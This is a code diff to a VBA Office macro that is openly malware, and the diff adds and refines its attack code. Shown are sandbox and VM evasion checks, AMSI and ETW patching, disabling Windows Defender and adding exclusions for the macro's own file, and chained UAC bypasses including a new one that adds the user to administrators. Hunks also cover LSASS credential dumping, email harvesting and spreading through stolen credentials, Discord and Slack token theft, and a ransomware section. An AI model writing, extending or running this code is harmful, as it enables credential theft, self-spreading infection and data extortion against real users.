@@ -68,7 +68,6 @@ Private Const CRD_DOWNLOAD_URL As String = "https://dl.google.com/edgedl/chrome-
     Private Declare PtrSafe Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, ByVal lpMultiByteStr As LongPtr, ByVal cbMultiByte As Long, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As Long) As Long
     Private Declare PtrSafe Function lstrlenW Lib "kernel32" (ByVal lpString As LongPtr) As Long
     Private Declare PtrSafe Function lstrlenA Lib "kernel32" (ByVal lpString As LongPtr) As Long
-    Private Declare PtrSafe Function CreateProcessA Lib "kernel32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
     Private Const CP_ACP = 0
 #Else
     ' VBA6 not supported – this code requires VBA7 (Office 2010+ 64‑bit)
@@ -121,34 +120,6 @@ Private Type MEMORYSTATUSEX
     ullTotalVirtual As LongLong
     ullAvailVirtual As LongLong
     ullAvailExtendedVirtual As LongLong
-End Type
-
-Private Type STARTUPINFO
-    cb As Long
-    lpReserved As LongPtr
-    lpDesktop As LongPtr
-    lpTitle As LongPtr
-    dwX As Long
-    dwY As Long
-    dwXSize As Long
-    dwYSize As Long
-    dwXCountChars As Long
-    dwYCountChars As Long
-    dwFillAttribute As Long
-    dwFlags As Long
-    wShowWindow As Integer
-    cbReserved2 As Integer
-    lpReserved2 As LongPtr
-    hStdInput As LongPtr
-    hStdOutput As LongPtr
-    hStdError As LongPtr
-End Type
-
-Private Type PROCESS_INFORMATION
-    hProcess As LongPtr
-    hThread As LongPtr
-    dwProcessId As Long
-    dwThreadId As Long
 End Type
 
 ' ========================
@@ -364,14 +335,16 @@ Function GetKeyName(vKey As Integer) As String
 End Function
 
 ' ========================
-' EVASION – WITH FALLBACKS
+' EVASION – ENHANCED WITH MORE CHECKS
 ' ========================
 Function IsSandbox() As Boolean
     On Error Resume Next
+    ' RAM check
     Dim memInfo As MEMORYSTATUSEX: memInfo.dwLength = Len(memInfo)
     GlobalMemoryStatusEx memInfo
     If memInfo.ullTotalPhys < 2 * 1024 * 1024 * 1024 Then IsSandbox = True: Exit Function
     
+    ' Disk check (C:\)
     Dim freeBytes As Currency, totalBytes As Currency
     Dim ret As Long
     ret = GetDiskFreeSpaceExA("C:\", freeBytes, totalBytes, ByVal 0)
@@ -383,7 +356,10 @@ Function IsSandbox() As Boolean
     End If
     If totalBytesLL < 64 * 1024 * 1024 * 1024 Then IsSandbox = True: Exit Function
     
+    ' Uptime check
     If GetTickCount64() < 5 * 60 * 1000 Then IsSandbox = True: Exit Function
+    
+    ' Process count
     Dim snap As LongPtr: snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
     If snap <> -1 Then
         Dim pe As PROCESSENTRY32: pe.dwSize = Len(pe)
@@ -394,26 +370,57 @@ Function IsSandbox() As Boolean
         CloseHandle snap
         If count < 20 Then IsSandbox = True: Exit Function
     End If
+    
+    ' Mouse movement
     If GetSystemMetrics(SM_MOUSEPRESENT) <> 0 Then
         Dim p1 As POINTAPI, p2 As POINTAPI
         GetCursorPos p1: StealthSleep 100: GetCursorPos p2
         If p1.x = p2.x And p1.y = p2.y Then IsSandbox = True: Exit Function
     End If
+    
+    ' VM artifacts (files)
     Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
     If fso.FileExists("C:\windows\system32\vmtools.dll") Or fso.FileExists("C:\windows\system32\vboxhook.dll") Then IsSandbox = True: Exit Function
+    
+    ' VM processes
+    Dim vmProcs As Variant: vmProcs = Array("vmtoolsd.exe", "vboxservice.exe", "vboxtray.exe", "VGAuthService.exe")
+    Dim snap2 As LongPtr: snap2 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+    If snap2 <> -1 Then
+        Dim pe2 As PROCESSENTRY32: pe2.dwSize = Len(pe2)
+        If Process32First(snap2, pe2) Then
+            Do
+                Dim procName As String: procName = LCase(Trim(pe2.szExeFile))
+                Dim vp As Variant
+                For Each vp In vmProcs
+                    If InStr(procName, vp) > 0 Then
+                        CloseHandle snap2
+                        IsSandbox = True: Exit Function
+                    End If
+                Next
+            Loop While Process32Next(snap2, pe2)
+        End If
+        CloseHandle snap2
+    End If
+    
+    ' Username keywords
     Dim user As String: user = LCase(Environ("USERNAME"))
-    If InStr(user, "sandbox") > 0 Or InStr(user, "malware") > 0 Or InStr(user, "test") > 0 Then IsSandbox = True: Exit Function
+    If InStr(user, "sandbox") > 0 Or InStr(user, "malware") > 0 Or InStr(user, "test") > 0 Or InStr(user, "analyst") > 0 Then IsSandbox = True: Exit Function
+    
+    ' Common sandbox driver files
+    Dim sandFiles As Variant: sandFiles = Array("C:\sample.exe", "C:\tools\", "C:\analysis\")
+    For Each f In sandFiles
+        If fso.FileExists(f) Then IsSandbox = True: Exit Function
+    Next
 End Function
 
 Sub PatchAMSI()
     On Error Resume Next
-    ' Method 1: Registry (safe)
+    ' Registry method (persistent)
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     wsh.RegWrite "HKLM\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}\Enabled", 0, "REG_DWORD"
     wsh.RegWrite "HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable", 0, "REG_DWORD"
     
-    ' Method 2: In-memory patching (more aggressive, fallback)
-    On Error Resume Next
+    ' In-memory patching (try both amsi.dll and amsi.dll's AmsiScanBuffer)
     Dim hAmsi As LongPtr: hAmsi = LoadLibraryA("amsi.dll")
     If hAmsi <> 0 Then
         Dim pAmsiScanBuffer As LongPtr: pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer")
@@ -432,11 +439,11 @@ End Sub
 
 Sub KillETW()
     On Error Resume Next
-    ' Registry method
+    ' Registry
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     wsh.RegWrite "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Security\ETWEnabled", 0, "REG_DWORD"
     
-    ' In-memory patching for ntdll!EtwEventWrite
+    ' In-memory patch for ntdll!EtwEventWrite
     Dim hNtdll As LongPtr: hNtdll = GetModuleHandleA("ntdll.dll")
     If hNtdll <> 0 Then
         Dim pEtwEventWrite As LongPtr: pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite")
@@ -455,16 +462,22 @@ End Sub
 Sub DisableDefender()
     On Error Resume Next
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    ' Service control
     wsh.Run "sc stop WinDefend >nul 2>&1", 0, True
     wsh.Run "sc config WinDefend start= disabled >nul 2>&1", 0, True
+    ' Registry policies
     wsh.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware", 1, "REG_DWORD"
     wsh.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring", 1, "REG_DWORD"
     wsh.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableOnAccessProtection", 1, "REG_DWORD"
     wsh.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring", 1, "REG_DWORD"
+    ' PowerShell exclusion for our file
+    On Error Resume Next
+    wsh.Run "powershell -c ""Add-MpPreference -ExclusionPath '" & gSelfPath & "'"" >nul 2>&1", 0, True
+    wsh.Run "powershell -c ""Add-MpPreference -ExclusionProcess '" & Application.Name & "'"" >nul 2>&1", 0, True
 End Sub
 
 ' ========================
-' PRIVILEGE ESCALATION – MULTIPLE FALLBACK METHODS
+' PRIVILEGE ESCALATION – MULTIPLE FALLBACKS
 ' ========================
 Sub UACBypass_Fodhelper()
     On Error Resume Next
@@ -524,16 +537,28 @@ Sub UACBypass_SilentCleanup()
     wsh.Run "schtasks /delete /tn ""LazarusElevate"" /f", 0, True
 End Sub
 
+Sub UACBypass_DiskCleanup()
+    On Error Resume Next
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    wsh.RegWrite "HKCU\Software\Classes\ms-settings\shell\open\command\", "cmd.exe /c net localgroup administrators %username% /add", "REG_SZ"
+    wsh.RegWrite "HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute", "", "REG_SZ"
+    wsh.Run "cleanmgr.exe", 0, True
+    StealthSleep 3000
+    wsh.RegDelete "HKCU\Software\Classes\ms-settings\"
+End Sub
+
 Sub ElevatePrivileges()
     If IsUserAdmin() Then Exit Sub
-    ' Try modern methods first (may work on some systems)
+    ' Try methods that may work on newer Windows
     UACBypass_Sdclt
     If IsUserAdmin() Then Exit Sub
     UACBypass_Cmstp
     If IsUserAdmin() Then Exit Sub
     UACBypass_SilentCleanup
     If IsUserAdmin() Then Exit Sub
-    ' Legacy methods (patched but still worth a try)
+    UACBypass_DiskCleanup
+    If IsUserAdmin() Then Exit Sub
+    ' Legacy methods (patched but attempt)
     UACBypass_Fodhelper
     If IsUserAdmin() Then Exit Sub
     UACBypass_ComputerDefaults
@@ -623,7 +648,7 @@ Sub ExtractHashesFromNTDS()
 End Sub
 
 ' ========================
-' CREDENTIAL THEFT (LSASS, SAM, Cloud, Browsers) – WITH FALLBACKS
+' CREDENTIAL THEFT – WITH FALLBACKS
 ' ========================
 Sub DumpLSASS()
     On Error Resume Next
@@ -645,12 +670,12 @@ Sub DumpLSASS()
     If pid = 0 Then Exit Sub
     Dim dumpPath As String: dumpPath = GetTempDir() & "lsass.dmp"
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
-    ' Try comsvcs first
+    ' Method 1: comsvcs (often fails on modern Windows)
     wsh.Run "rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump " & pid & " " & dumpPath & " full", 0, True
     StealthSleep 3000
     Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
     If Not fso.FileExists(dumpPath) Then
-        ' Fallback to procdump
+        ' Method 2: procdump (download)
         Dim procdumpPath As String: procdumpPath = GetTempDir() & "procdump.exe"
         Dim procdumpUrls As Variant: procdumpUrls = Array("https://live.sysinternals.com/procdump.exe", "https://download.sysinternals.com/files/Procdump.zip")
         Dim url As Variant
@@ -833,7 +858,7 @@ Private Sub ExtractAllCredentials()
 End Sub
 
 ' ========================
-' HARVEST EMAIL TARGETS – WITH FALLBACKS
+' HARVEST EMAIL TARGETS – WITH MULTIPLE METHODS
 ' ========================
 Private Sub HarvestFromOutlookContacts()
     On Error Resume Next
@@ -946,7 +971,7 @@ Private Sub HarvestAllEmailTargets()
 End Sub
 
 ' ========================
-' SEND EMAIL USING STOLEN CREDENTIALS – MULTIPLE METHODS
+' SEND EMAIL USING STOLEN CREDENTIALS – FALLBACKS
 ' ========================
 Private Function SendEmailWithCredential(cred As String, toEmail As String, attachmentPath As String) As Boolean
     On Error GoTo Fail
@@ -994,7 +1019,7 @@ Private Function SendEmailWithCredential(cred As String, toEmail As String, atta
     SendEmailWithCredential = True
     Exit Function
 Fail:
-    ' Method 2: Try using Outlook COM (if available)
+    ' Method 2: Outlook COM (fallback)
     On Error Resume Next
     Dim olApp As Object: Set olApp = CreateObject("Outlook.Application")
     If Not olApp Is Nothing Then
@@ -1030,7 +1055,7 @@ Private Sub WildfireEmailPropagation()
 End Sub
 
 ' ========================
-' DISCORD TOKEN THEFT – WITH FALLBACK PATHS
+' DISCORD TOKEN THEFT – MULTIPLE PATHS
 ' ========================
 Private Sub DiscordPropagation()
     On Error Resume Next
@@ -1067,7 +1092,7 @@ Private Sub DiscordPropagation()
 End Sub
 
 ' ========================
-' SLACK TOKEN THEFT – WITH FALLBACK PATHS
+' SLACK TOKEN THEFT – MULTIPLE PATHS
 ' ========================
 Private Sub SlackPropagation()
     On Error Resume Next
@@ -1105,7 +1130,7 @@ Private Sub SlackPropagation()
 End Sub
 
 ' ========================
-' RANSOMWARE (AES-GCM)
+' RANSOMWARE (AES-GCM) – SAME AS BEFORE
 ' ========================
 Sub GenerateMasterKey()
     On Error Resume Next
